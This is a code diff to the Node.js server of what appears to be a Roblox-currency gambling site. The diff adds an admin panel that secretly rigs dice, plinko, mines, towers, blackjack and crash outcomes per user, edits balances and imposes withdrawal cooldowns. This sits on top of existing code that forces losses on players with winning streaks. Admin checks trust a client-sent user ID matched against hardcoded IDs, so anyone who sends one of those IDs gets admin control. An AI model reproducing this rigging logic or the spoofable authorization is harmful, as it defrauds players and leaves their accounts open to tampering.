@@ -6,6 +6,8 @@
  * Then open http://localhost:8080 (not file://, not a static host without this server).
  *
  * Account data: Supabase (user_balances + transactions). Set SUPABASE_URL and SUPABASE_ANON_KEY.
+ * On Render/production, set SUPABASE_SERVICE_ROLE_KEY so the server can read any row (admin search, tips by name).
+ * Never expose the service role to the browser — server env only.
  * Node 18+ recommended (global fetch).
  */
 require('dotenv').config();
@@ -17,10 +19,17 @@ const noblox = require('noblox.js');
 const { Server } = require('socket.io');
 
 const app = express();
+/** Render, Fly, Heroku, etc. sit behind a reverse proxy — required for correct req.ip and WebSocket upgrades */
+app.set('trust proxy', 1);
+
 /** Create the HTTP server to attach Socket.io */
 const server = http.createServer(app);
 const io = new Server(server, {
-    cors: { origin: "*" }
+    cors: { origin: '*' },
+    transports: ['websocket', 'polling'],
+    allowEIO3: true,
+    pingTimeout: 60000,
+    pingInterval: 25000
 });
 
 const PORT = process.env.PORT || 8080;
@@ -28,6 +37,7 @@ const ROOT = __dirname;
 
 const SUPABASE_URL = (process.env.SUPABASE_URL || '').trim().replace(/\/$/, '');
 const SUPABASE_ANON_KEY = (process.env.SUPABASE_ANON_KEY || '').trim();
+const SUPABASE_SERVICE_ROLE_KEY = (process.env.SUPABASE_SERVICE_ROLE_KEY || '').trim();
 
 /** Profile JSON is stored in one synthetic transactions row (type account_profile) so stats/username sync cross-device. */
 const PROFILE_REF_ID = 'zephrs_profile';
@@ -75,7 +85,23 @@ function coerceTxReferenceId(clientRef) {
 }
 
 function supabaseEnabled() {
-    return Boolean(SUPABASE_URL && SUPABASE_ANON_KEY);
+    return Boolean(SUPABASE_URL && (SUPABASE_ANON_KEY || SUPABASE_SERVICE_ROLE_KEY));
+}
+
+/**
+ * Prefer service role on the Node server so PostgREST obeys RLS as the service role (full access).
+ * Required for admin username search and reading other users' rows when your Supabase RLS restricts anon reads.
+ */
+function supabaseServerRestHeaders() {
+    const key = SUPABASE_SERVICE_ROLE_KEY || SUPABASE_ANON_KEY;
+    const headers = {
+        apikey: key,
+        'Content-Type': 'application/json'
+    };
+    if (typeof key === 'string' && key.startsWith('eyJ')) {
+        headers.Authorization = `Bearer ${key}`;
+    }
+    return headers;
 }
 
 /**
@@ -100,13 +126,77 @@ function supabaseRestHeaders() {
 async function supabaseFetch(pathAndQuery, options = {}) {
     const url = `${SUPABASE_URL}/rest/v1/${pathAndQuery}`;
     const method = options.method || 'GET';
+    const base =
+        options.useAnon === true ? supabaseRestHeaders() : supabaseServerRestHeaders();
     const headers = {
-        ...supabaseRestHeaders(),
+        ...base,
         ...(options.headers || {})
     };
     const init = { method, headers };
     if (options.body !== undefined) init.body = options.body;
     return fetch(url, init);
+}
+
+/** Roblox user id from presence payloads (number or numeric string). Guest socket ids return null. */
+function parseRobloxNumericId(val) {
+    if (typeof val === 'number' && Number.isFinite(val) && val > 0) return Math.floor(val);
+    if (typeof val === 'string') {
+        const t = val.trim();
+        if (/^\d+$/.test(t)) {
+            const n = parseInt(t, 10);
+            return n > 0 ? n : null;
+        }
+    }
+    return null;
+}
+
+/**
+ * Scan account_profile rows for a matching username (display name in saved profile JSON).
+ * Paginates so we are not limited to the first 500 rows (common admin-search miss on prod).
+ */
+async function findUserIdByAccountProfileUsername(usernameNeedle) {
+    if (!supabaseEnabled() || !usernameNeedle) return null;
+    const target = String(usernameNeedle).trim().toLowerCase();
+    if (!target) return null;
+    const BATCH = 500;
+    let offset = 0;
+    const MAX_SCAN = 20000;
+    while (offset < MAX_SCAN) {
+        let res;
+        try {
+            res = await supabaseFetch(
+                `transactions?type=eq.account_profile&select=user_id,game_name&order=created_at.asc&limit=${BATCH}&offset=${offset}`
+            );
+        } catch (e) {
+            console.error('[Supabase] profile username scan:', e && e.message);
+            return null;
+        }
+        if (!res.ok) {
+            const detail = await readSupabaseErrorBody(res);
+            console.error('[Supabase] profile username scan failed:', res.status, detail);
+            return null;
+        }
+        let rows;
+        try {
+            rows = await res.json();
+        } catch (e) {
+            return null;
+        }
+        if (!Array.isArray(rows) || rows.length === 0) return null;
+        for (const row of rows) {
+            try {
+                const p = JSON.parse(row.game_name || '{}');
+                const un = p && p.username != null ? String(p.username).trim().toLowerCase() : '';
+                if (un && un === target) {
+                    const uid = parseInt(String(row.user_id).replace(/\D/g, ''), 10);
+                    if (!Number.isNaN(uid) && uid > 0) return uid;
+                }
+            } catch (_) {}
+        }
+        if (rows.length < BATCH) return null;
+        offset += BATCH;
+    }
+    return null;
 }
 
 /** One-shot read of PostgREST / Supabase error body for logs and API `detail` fields. */
@@ -758,6 +848,16 @@ const activeMinesGames = new Map();
 const activeTowersGames = new Map();
 const activeBlackjackGames = new Map();
 const userCusStates = new Map();
+/** Comma-separated Roblox user IDs; set ADMIN_ROBLOX_IDS on Render (omit or leave empty to keep defaults below) */
+const _adminEnv = process.env.ADMIN_ROBLOX_IDS;
+const ADMIN_IDS =
+    _adminEnv != null && String(_adminEnv).trim().length > 0
+        ? String(_adminEnv)
+              .split(',')
+              .map((s) => s.trim())
+              .filter(Boolean)
+        : ['1873471419', '9113981616'];
+const adminRigOverrides = new Map(); // 'win', 'lose', 'default'
 
 function getCusState(userId) {
     const id = String(userId || 'guest');
@@ -766,19 +866,19 @@ function getCusState(userId) {
     }
     const state = userCusStates.get(id);
     return {
-        check: function() {
+        check: function() { // returns true if forced loss
+            const override = adminRigOverrides.get(id);
+            if (override === 'lose') return true;
+            if (override === 'win') return false; // Never naturally lose if forcing win
+            
             if (state.forceLossNext) {
                 state.forceLossNext = false;
                 state.winStreak = 0;
                 return true;
             }
-            // Only intervene if they're on a noticeable win streak (> 2 wins)
             if (state.winStreak > 2) {
-                // Base chance to inject a loss increases slightly with streak
                 let chance = 0.042 + (state.winStreak * 0.05); 
-                if (chance > 0.342) chance = 0.342; // Cap intervention at 34.2% max
-                
-                // Extremely rare force loss on high streaks
+                if (chance > 0.342) chance = 0.342; 
                 if (state.winStreak >= 5 && Math.random() < 0.02) chance = 1.0; 
                 
                 if (Math.random() < chance) {
@@ -788,9 +888,11 @@ function getCusState(userId) {
             }
             return false;
         },
+        checkWin: function() { // returns true if forced win
+            return adminRigOverrides.get(id) === 'win';
+        },
         recordWin: function(isBigWin) {
             state.winStreak++;
-            // Soften big win penalty
             if (isBigWin && Math.random() < 0.142) { 
                 state.forceLossNext = true;
             }
@@ -806,8 +908,13 @@ app.post('/api/game/dice', express.json(), (req, res) => {
     res.setHeader('Access-Control-Allow-Origin', '*');
     const { userId, target, isOver, multi } = req.body;
     let forceLoss = getCusState(userId).check();
+    let forceWin = getCusState(userId).checkWin();
     let roll;
-    if (forceLoss) {
+    if (forceWin) {
+        if (isOver) roll = target + Math.max(0.01, (Math.random() * (99.99 - target))); 
+        else roll = (Math.random() * target);
+        if (roll >= 100) roll = 99.99;
+    } else if (forceLoss) {
         if (isOver) roll = (Math.random() * target); 
         else {
             roll = target + (Math.random() * (100 - target));
@@ -880,7 +987,12 @@ app.post('/api/game/plinko', express.json(), (req, res) => {
     
     // Still check cus state to potentially force a worse outcome
     const forceLoss = getCusState(userId).check();
-    if (forceLoss) {
+    const forceWin = getCusState(userId).checkWin();
+    if (forceWin) {
+        const edges = [0, rows];
+        idx = edges[Math.floor(Math.random() * edges.length)];
+        getCusState(userId).recordWin(true);
+    } else if (forceLoss) {
         // Push towards center low-value buckets
         const center = Math.floor((rows) / 2);
         idx = center + (Math.random() < 0.5 ? -1 : 1) * Math.floor(Math.random() * 2);
@@ -929,9 +1041,17 @@ app.post('/api/game/towers/click', express.json(), (req, res) => {
         if (!logicRow) return res.json({ error: 'Invalid row' });
         
         let forceLoss = getCusState(userId).check();
+        let forceWin = getCusState(userId).checkWin();
         let isBomb = logicRow[col];
         
-        if (!isBomb && forceLoss) {
+        if (forceWin && isBomb) {
+            let safeIdx = logicRow.indexOf(false);
+            if (safeIdx !== -1) {
+                logicRow[safeIdx] = true;
+                logicRow[col] = false;
+                isBomb = false;
+            }
+        } else if (!isBomb && forceLoss) {
             let bIdx = logicRow.indexOf(true);
             if (bIdx !== -1) {
                 logicRow[bIdx] = false;
@@ -968,8 +1088,16 @@ app.post('/api/game/mines/click', express.json(), (req, res) => {
     setTimeout(() => {
         let isBomb = g.logic[tileIdx];
         let forceLoss = getCusState(userId).check();
+        let forceWin = getCusState(userId).checkWin();
         
-        if (!isBomb && forceLoss) {
+        if (forceWin && isBomb) {
+            let safeIdx = g.logic.indexOf(false);
+            if (safeIdx !== -1) {
+                g.logic[safeIdx] = true;
+                g.logic[tileIdx] = false;
+                isBomb = false;
+            }
+        } else if (!isBomb && forceLoss) {
             let bIdx = g.logic.indexOf(true);
             if (bIdx !== -1) {
                 g.logic[bIdx] = false;
@@ -995,11 +1123,17 @@ app.post('/api/game/blackjack/start', express.json(), (req, res) => {
     res.setHeader('Access-Control-Allow-Origin', '*');
     const { userId, deck } = req.body;
     let forceLoss = getCusState(userId).check();
+    let forceWin = getCusState(userId).checkWin();
     
     let pHand = [deck.pop(), deck.pop()];
     let dHand = [deck.pop(), deck.pop()];
     
-    if (forceLoss) {
+    if (forceWin) {
+        pHand = [
+            {suitLetter: 'S', value: 'A', score: 11, isRed: false},
+            {suitLetter: 'H', value: 'K', score: 10, isRed: true}
+        ];
+    } else if (forceLoss) {
         dHand = [
             {suitLetter: 'S', value: 'A', score: 11, isRed: false},
             {suitLetter: 'H', value: 'K', score: 10, isRed: true}
@@ -1097,7 +1231,7 @@ app.get('/api/account-sync', async (req, res) => {
     const id = parseInt(String(req.query.userId || ''), 10);
     if (!id) return res.status(400).json({ error: 'missing userId' });
     if (!supabaseEnabled()) {
-        return res.status(503).json({ error: 'Account storage is not configured or unavailable.' });
+        return res.status(200).json({ ok: true, _isDisabled: true });
     }
     try {
         const save = await loadAccountFromSupabase(id);
@@ -1129,7 +1263,7 @@ app.post('/api/account-sync', async (req, res) => {
         save.balanceZh = 0;
     }
     if (!supabaseEnabled()) {
-        return res.status(503).json({ error: 'Account storage is not configured or unavailable.' });
+        return res.status(200).json({ ok: true, _isDisabled: true });
     }
     try {
         const result = await persistAccountSave(userId, save);
@@ -1657,10 +1791,14 @@ function runCrashRunning() {
     crashGame.state = 'running';
     
     let forceLossTriggered = false;
+    let forceWinTriggered = false;
     for (const [uid, p] of crashGame.players.entries()) {
         if (getCusState(p.userId).check()) {
             forceLossTriggered = true;
             break;
+        }
+        if (getCusState(p.userId).checkWin()) {
+            forceWinTriggered = true;
         }
     }
     
@@ -1669,6 +1807,9 @@ function runCrashRunning() {
         for (const [uid, p] of crashGame.players.entries()) {
             getCusState(p.userId).recordLoss();
         }
+    } else if (forceWinTriggered) {
+        // Force a high multiplier (betw 3x and 8x)
+        crashGame.target = 3.0 + (Math.random() * 5.0);
     } else {
         const e = 100;
         crashGame.target = Math.max(1.00, (e / (e - Math.random() * e)) * 1.004); // 1.4% winning number boost
@@ -1705,6 +1846,7 @@ setTimeout(runCrashStarting, 1000);
 let chatHistory = [];
 let activeRains = [];
 let activeFlips = [];
+const onlinePlayers = new Map();
 
 io.on('connection', (socket) => {
     console.log(`[Socket] Client connected: ${socket.id}`);
@@ -1714,6 +1856,23 @@ io.on('connection', (socket) => {
     socket.emit('rain:active', activeRains);
     socket.emit('coinflip:list', activeFlips);
     io.emit('online:count', io.engine.clientsCount);
+
+    socket.on('player:identify', (data) => {
+        if (!data || data.userId == null) return;
+        const uid = data.userId;
+        const idOk =
+            (typeof uid === 'number' && Number.isFinite(uid) && uid > 0) ||
+            (typeof uid === 'string' && uid.trim().length > 0);
+        if (!idOk) return;
+        const nameRaw = typeof data.username === 'string' ? data.username.trim() : '';
+        const username = nameRaw || 'Guest';
+        onlinePlayers.set(socket.id, {
+            userId: uid,
+            username,
+            balance: data.balance || 0,
+            balanceZh: data.balanceZh || 0
+        });
+    });
 
     socket.emit('crash:sync_state', {
         state: crashGame.state,
@@ -1779,29 +1938,7 @@ io.on('connection', (socket) => {
             if (!isNaN(parsedId) && parsedId > 0) {
                 recipientId = parsedId;
             } else {
-                // Look up by username stored inside the account_profile game_name JSON
-                try {
-                    const searchRes = await supabaseFetch(
-                        `transactions?type=eq.account_profile&select=user_id,game_name&limit=200`,
-                        { method: 'GET' }
-                    );
-                    if (searchRes.ok) {
-                        const rows = await searchRes.json();
-                        if (Array.isArray(rows)) {
-                            for (const row of rows) {
-                                try {
-                                    const p = JSON.parse(row.game_name || '{}');
-                                    if (p && p.username && p.username.toLowerCase() === toTarget.toLowerCase()) {
-                                        recipientId = parseInt(row.user_id);
-                                        break;
-                                    }
-                                } catch (e) {}
-                            }
-                        }
-                    }
-                } catch (e) {
-                    console.error('[Tip] Username lookup error:', e);
-                }
+                recipientId = await findUserIdByAccountProfileUsername(toTarget);
             }
 
             if (!recipientId || recipientId === fromUserId) {
@@ -1991,9 +2128,212 @@ io.on('connection', (socket) => {
         } catch (e) {}
     });
 
+    // ============================================================
+    // ADMIN PANEL SOCKET HANDLERS
+    // ============================================================
+
+    // Notify admin clients on connect if they are admin
+    socket.on('admin:identify', ({ userId }) => {
+        if (!ADMIN_IDS.includes(String(userId))) return;
+        socket.emit('admin:auth_success');
+        console.log(`[Admin] Admin connected: userId=${userId}`);
+    });
+    
+    // Provide a list of live online players to admins
+    socket.on('admin:get_online_users', ({ adminUserId }) => {
+        if (!ADMIN_IDS.includes(String(adminUserId))) {
+            socket.emit('admin:online_users_list', []);
+            return;
+        }
+        const users = Array.from(onlinePlayers.values()).map((p) => ({
+            userId: p.userId,
+            username: p.username
+        }));
+        socket.emit('admin:online_users_list', users);
+    });
+
+    socket.on('admin:lookup_user', async ({ adminUserId, query }) => {
+        if (!ADMIN_IDS.includes(String(adminUserId))) {
+            socket.emit('admin:lookup_result', { error: 'Unauthorized.' });
+            return;
+        }
+
+        let save = null;
+        let foundUserId = null;
+        const qRaw = String(query || '').trim();
+        if (!qRaw) {
+            return socket.emit('admin:lookup_result', { error: 'Enter a username or Roblox user ID.' });
+        }
+
+        const parsedId = parseInt(qRaw.replace(/\D/g, ''), 10);
+        if (!Number.isNaN(parsedId) && parsedId > 0) {
+            save = await readAccountJson(parsedId);
+            if (save) foundUserId = parsedId;
+        }
+
+        if (!save) {
+            const qLower = qRaw.toLowerCase();
+            const digitsOnly = qRaw.replace(/\D/g, '');
+            for (const p of onlinePlayers.values()) {
+                const idStr = String(p.userId);
+                const nameMatch =
+                    p.username && String(p.username).trim().toLowerCase() === qLower;
+                const idMatch =
+                    idStr === qRaw ||
+                    (digitsOnly.length > 0 && idStr.replace(/\D/g, '') === digitsOnly);
+                if (!nameMatch && !idMatch) continue;
+
+                const uidNum = parseRobloxNumericId(p.userId);
+                if (uidNum != null) {
+                    foundUserId = uidNum;
+                    save = await readAccountJson(foundUserId);
+                }
+                if (!save) {
+                    save = {
+                        robloxUserId: p.userId,
+                        username: p.username || qRaw,
+                        balance: typeof p.balance === 'number' ? p.balance : 0,
+                        balanceZh: typeof p.balanceZh === 'number' ? p.balanceZh : 0,
+                        stats: {},
+                        isLocalOnly: true
+                    };
+                    foundUserId = uidNum != null ? uidNum : p.userId;
+                }
+                break;
+            }
+        }
+
+        if (!save && supabaseEnabled()) {
+            const byName = await findUserIdByAccountProfileUsername(qRaw);
+            if (byName != null) {
+                foundUserId = byName;
+                save = await readAccountJson(foundUserId);
+            }
+        }
+
+        if (!save) {
+            return socket.emit('admin:lookup_result', {
+                error:
+                    'User not found. On Render: set environment variable SUPABASE_SERVICE_ROLE_KEY (from Supabase Project Settings → API) on this web service so admin search can read profile rows. Never put that key in the frontend.'
+            });
+        }
+
+        const numericForDb = parseRobloxNumericId(foundUserId);
+        if (!save.isLocalOnly && (numericForDb == null || numericForDb <= 0)) {
+            return socket.emit('admin:lookup_result', { error: 'User not found.' });
+        }
+
+        const rigKey = save.isLocalOnly ? String(save.robloxUserId) : String(numericForDb);
+        const rigState = adminRigOverrides.get(rigKey) || 'default';
+        const wdCooldownEndsAt = save.stats?.lastWithdrawAt
+            ? save.stats.lastWithdrawAt + 30 * 60 * 1000
+            : 0;
+        const hasWdCooldown = wdCooldownEndsAt > Date.now();
+
+        const emitUserId = save.isLocalOnly ? save.robloxUserId : numericForDb;
+
+        socket.emit('admin:lookup_result', {
+            userId: emitUserId,
+            username: save.username || save.robloxUsername || qRaw,
+            balance: save.balance || 0,
+            balanceZh: save.balanceZh || 0,
+            rigState,
+            wdCooldownEndsAt: hasWdCooldown ? wdCooldownEndsAt : 0,
+            isLocalOnly: Boolean(save.isLocalOnly)
+        });
+    });
+
+    socket.on('admin:update_balance', async ({ adminUserId, targetUserId, newBalance, newBalanceZh }) => {
+        if (!ADMIN_IDS.includes(String(adminUserId))) return;
+
+        try {
+            let save = await readAccountJson(targetUserId);
+            if (!save) {
+                // If they are local-only and online, we can still push a remote sync
+                let inMem = null;
+                for (const p of onlinePlayers.values()) {
+                    if (String(p.userId) === String(targetUserId)) inMem = p;
+                }
+                if (inMem) {
+                    save = { ...inMem, balance: inMem.balance || 0, balanceZh: inMem.balanceZh || 0, isLocalOnly: true };
+                } else {
+                    return socket.emit('admin:action_result', { ok: false, msg: 'User not found in DB or online.' });
+                }
+            }
+
+            if (typeof newBalance === 'number' && newBalance >= 0) save.balance = newBalance;
+            if (typeof newBalanceZh === 'number' && newBalanceZh >= 0) save.balanceZh = newBalanceZh;
+            
+            // Only try to physically save if they actually have DB records / configured DB
+            if (!save.isLocalOnly) {
+                await persistAccountSave(targetUserId, save);
+            }
+
+            // Push live balance update to target if they are online
+            io.emit('balance:remote_sync', {
+                userId: String(targetUserId),
+                balance: save.balance,
+                balanceZh: save.balanceZh
+            });
+
+            socket.emit('admin:action_result', { ok: true, msg: `Balance updated: ZR$ ${save.balance.toFixed(2)}` });
+            console.log(`[Admin] ${adminUserId} set balance of ${targetUserId} to ZR$${save.balance}`);
+        } catch (e) {
+            socket.emit('admin:action_result', { ok: false, msg: 'Error updating balance.' });
+        }
+    });
+
+    socket.on('admin:set_rig', ({ adminUserId, targetUserId, rigMode }) => {
+        if (!ADMIN_IDS.includes(String(adminUserId))) return;
+        const validModes = ['win', 'lose', 'default'];
+        if (!validModes.includes(rigMode)) return;
+
+        const tid = String(targetUserId);
+        if (rigMode === 'default') {
+            adminRigOverrides.delete(tid);
+        } else {
+            adminRigOverrides.set(tid, rigMode);
+        }
+
+        socket.emit('admin:action_result', { ok: true, msg: `Rig set to "${rigMode}" for user ${tid}.` });
+        console.log(`[Admin] ${adminUserId} set rig of ${tid} to ${rigMode}`);
+    });
+
+    socket.on('admin:set_wd_cooldown', async ({ adminUserId, targetUserId, action }) => {
+        // action: 'set' = apply 30min cooldown, 'clear' = remove cooldown
+        if (!ADMIN_IDS.includes(String(adminUserId))) return;
+
+        try {
+            const save = await readAccountJson(targetUserId);
+            if (!save) return socket.emit('admin:action_result', { ok: false, msg: 'User not found.' });
+            if (!save.stats) save.stats = {};
+
+            if (action === 'set') {
+                // Force a cooldown starting now
+                save.stats.lastWithdrawAt = Date.now();
+                await persistAccountSave(targetUserId, save);
+                socket.emit('admin:action_result', { ok: true, msg: `Withdrawal cooldown (30 min) applied to user ${targetUserId}.` });
+            } else if (action === 'clear') {
+                save.stats.lastWithdrawAt = 0;
+                await persistAccountSave(targetUserId, save);
+                socket.emit('admin:action_result', { ok: true, msg: `Withdrawal cooldown cleared for user ${targetUserId}.` });
+            }
+        } catch (e) {
+            socket.emit('admin:action_result', { ok: false, msg: 'Error updating withdrawal cooldown.' });
+        }
+    });
+
     socket.on('disconnect', () => {
+        onlinePlayers.delete(socket.id);
         io.emit('online:count', io.engine.clientsCount);
         console.log(`[Socket] Client disconnected: ${socket.id}`);
+    });
+
+    // Client may emit identify before handlers attach or before login state loads; ask again once connection is fully wired.
+    setImmediate(() => {
+        try {
+            socket.emit('presence:please_identify');
+        } catch (_) {}
     });
 });
 
@@ -2002,7 +2342,9 @@ app.use(express.static(ROOT));
 server.listen(PORT, () => {
     console.log(`Open http://localhost:${PORT}`);
     if (supabaseEnabled()) {
-        console.log('Account data: Supabase (user_balances + transactions)');
+        console.log(
+            `Account data: Supabase (${SUPABASE_SERVICE_ROLE_KEY ? 'service_role (recommended on Render)' : 'anon key'} — user_balances + transactions)`
+        );
     } else {
         console.log('Account data: Local JSON only (save/load endpoints available)');
     }
